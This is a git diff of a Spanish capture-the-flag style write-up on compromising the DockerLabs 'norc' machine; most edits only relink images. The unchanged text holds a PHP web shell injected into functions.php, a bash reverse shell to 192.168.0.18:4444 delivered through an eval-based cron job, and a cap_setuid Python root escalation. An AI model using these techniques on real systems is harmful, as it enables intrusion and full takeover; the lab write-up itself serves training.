@@ -27,14 +27,16 @@ author: Maxi Barcia
 date: 2025-11-07
 draft: false
 ---
-![[Pasted image 20251104173523.png]]
-![image-center](/assets/images/headers/dockerlabs.png)
-{: .align-center}
+
+
+![image-center](/assets/images/headers/dockerlabs.png){: .align-center}
 
 
 
 ### Lanzamiento laboratorio
 ![[Pasted image 20251030213115.png|500]]
+![DockerLabs](/assets/images/posts/DockerLabs/norc/docker1.png){: .align-center}
+
 Se procede a lanzar el docker sobre la maquina a vulnerar con numero de ip --> 172.17.0.2
 
 ## 🎯 0. Executive Summary (Resumen Ejecutivo)
@@ -87,9 +89,8 @@ bash
 nmap -p- --open --min-rate=5000 -sS -v -Pn -n -A 172.17.0.2 -oX nmap.xml
 ```
 
-
-![[Pasted image 20251030213936.png]]
-![[Pasted image 20251030214543.png]]
+![Nmap](/assets/images/posts/DockerLabs/norc/nmap.png){: .align-center}
+![Nmap_2](/assets/images/posts/DockerLabs/norc/nmap2.png){: .align-center}
 
 | Puerto | Servicio | Versión                                       | Estado |
 | :----- | :------- | :-------------------------------------------- | :----- |
@@ -126,7 +127,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.25 seconds
 ```
 
 
-![[Pasted image 20251030215805.png]]
+![URL](/assets/images/posts/DockerLabs/norc/url_local.png){: .align-center}
 Se esta aplicando una redireccion a norc.labs y no consigue resolver debido a la falta de la informacion en el archivo /etc/hosts.
 ```bash
 echo '127.17.0.2\tnorc.labs' | sudo tee -a /etc/hosts
@@ -265,7 +266,9 @@ Para verificar si existían vulnerabilidades conocidas en la infraestructura det
 **Conclusión Estratégica:** Dada la contramedida de _brute-force_ y la detección de una infraestructura de WordPress (Apache 2.4.59), la estrategia se reorientó hacia la **explotación de vulnerabilidades de _plugins_ específicos** que pudieran ser abusadas sin autenticación.
 
 En la siguiente foto se puede ver como se intenta un acceso pero automaticamente dice que solo quedan 2 intentos, es decir que el panel cuenta con contramedidas para la fuerza bruta.
-![[Pasted image 20251103171551.png]]
+
+
+![Wordpress](/assets/images/posts/DockerLabs/norc/wordpres1.png){: .align-center}
 
 
 
@@ -332,7 +335,8 @@ Se actualizó la resolución de DNS local y se accedió al subdominio. La navega
 
 La contraseña obtenida fue utilizada exitosamente para la **autenticación administrativa** en el panel de WordPress
 
-![[Pasted image 20251103171746.png]]
+
+![Wordpress](/assets/images/posts/DockerLabs/norc/wordpres2.png){: .align-center}
 
 ### 3.3. Establecimiento de Ejecución Remota de Código (RCE)
 
@@ -344,7 +348,8 @@ Se eligió modificar el archivo `functions.php` del tema para inyectar una funci
 system($_GET['cmd'])
 ```
 
-![[Pasted image 20251104121907.png]]
+
+![CMD_RCE](/assets/images/posts/DockerLabs/norc/wordpres1.png){: .align-center}
 
 
 La **Ejecución Remota de Código (RCE)** se confirmó inmediatamente mediante la ejecución del comando `id` a través del navegador:
@@ -367,7 +372,8 @@ Confirmé que podía ejecutar comandos en el sistema.
 Como metodología alternativa al ataque de inyección directa en el tema (`functions.php`), se consideró la instalación de un _plugin_ malicioso para asegurar el acceso remoto.
 
 1. **Carga del Plugin:** Se utilizó la función de carga de plugins del panel de administración de WordPress para subir un _plugin_ preexistente que contenía una _reverse shell_ (`reverse-shell-v1.4.0.zip`).
-	![[Pasted image 20251104101227.png|500]]
+
+![Credentials](/assets/images/posts/DockerLabs/norc/credentials_1.png){: .align-center}   
     
 2. **Activación y Ejecución:** Tras la carga y activación del _plugin_ "rev shell", la conexión de _reverse shell_ se iniciaba al acceder a la URL del _plugin_ inyectado, proporcionando una consola interactiva al atacante.
     
@@ -389,7 +395,8 @@ Debido a problemas de inestabilidad y cierres inesperados de la consola, se opt�
 
 Y al final se consiguio el RevShell con el metodo atenrior de modificar el Plugin:
 
-![[Pasted image 20251104115408.png|700]]
+
+![Plugin](/assets/images/posts/DockerLabs/norc/plugin1.png){: .align-center}
 
 
 ## ## 5. Post-Exploitation y Preparación para la Escalada de Privilegios
@@ -428,7 +435,8 @@ El análisis reveló dos hallazgos de alto riesgo que constituían la cadena de 
     
 2. **Abuso de Capabilities (Escalada a `root`):** Configuración de _capabilities_ elevadas (`cap_setuid`) en el binario de Python.
 [LinPeas.sh GitHub](https://github.com/peass-ng/PEASS-ng/blob/master/linPEAS/README.md)
-![[Pasted image 20251104161324.png]]
+
+![Linpeas](/assets/images/posts/DockerLabs/norc/linpeas.png){: .align-center}
 
 
 ## 6. Privilege Escalation (Parte 1): Explotación del Cron Job
@@ -438,6 +446,8 @@ El análisis reveló dos hallazgos de alto riesgo que constituían la cadena de 
 La primera etapa de la escalada de privilegios se logró explotando una tarea programada (Cron Job) mal configurada, lo que permitió elevar el acceso de `www-data` al usuario del sistema **`kvzlx`**.
 
 Expuesto el codigo y dejandonos ver su funcionamiento para posterior realizar la modificacion y beneficio en la escalada de privilegios como muestra la siguiente captura de pantalla. 
+
+![Scrpt](/assets/images/posts/DockerLabs/norc/script1.png){: .align-center}
 ![[Pasted image 20251104161455.png]]
 El uso de eval sin tratamiento adecuado en un script cron representa una vulnerabilidad crítica. Permite ejecutar comandos arbitrarios si se controla el contenido del archivo **‘/var/www/html/.wp-encrypted.txt’**.
 
@@ -460,7 +470,9 @@ En la siguiente captura se puede apreciar una particion de 4 pantallas.
 La primera arriba a la izquierda se puede ver que se probo la ejecucion aun viendo que no contaba con permisos pero en la ventana de abajo se aprecia
 como se realizo la codificacion del comando **/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.18/4444 0>&1'** el cual se procedio a agregarlo en el archivo **/var/www/html/.wp-encrypted.txt**
 dejando por ultimo a la ventana de abajo a la derecha con el acceso como el usuario **kvzlx**
-![[Pasted image 20251104161226.png]]
+
+
+![Up_1](/assets/images/posts/DockerLabs/norc/up1.png){: .align-center}
 
 Tras esperar el intervalo de ejecución programado del Cron Job (típicamente un minuto), la carga útil se ejecutó con éxito. Esto resultó en una nueva conexión de _reverse shell_ en el puerto 4444.
 
@@ -484,7 +496,8 @@ Bash
 ```
 find / -type f 2>/dev/null|xargs /sbin/getcap -r 2>/dev/null|grep cap_setuid=ep
 ```
-![[Pasted image 20251104171403.png]]
+
+![Wordpress](/assets/images/posts/DockerLabs/norc/find1.png){: .align-center}
 Este escaneo reveló que el binario del intérprete de Python (`/opt/python3`) tenía la _capability_ **`cap_setuid+ep`** configurada. Esta configuración es un fallo de seguridad crítico, ya que permite al binario **cambiar su ID de usuario efectivo** a cualquier ID, incluyendo **cero (root)**, sin requerir una contraseña.
 
 ### 7.2. Abuso de la Capability `cap_setuid`
@@ -493,9 +506,7 @@ Utilizando el recurso de **GTFOBins** para el abuso de _capabilities_ en Python,
 
 **Carga Útil de Explotación:** La explotación se realizó mediante la ejecución directa de un _script_ Python:
 
-Python
-
-```
+```python
 /opt/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
@@ -518,6 +529,8 @@ whoami
 root
 ```
 
+
+![Root](/assets/images/posts/DockerLabs/norc/root.png){: .align-center}
 ![[Pasted image 20251104163028.png]]
 
 
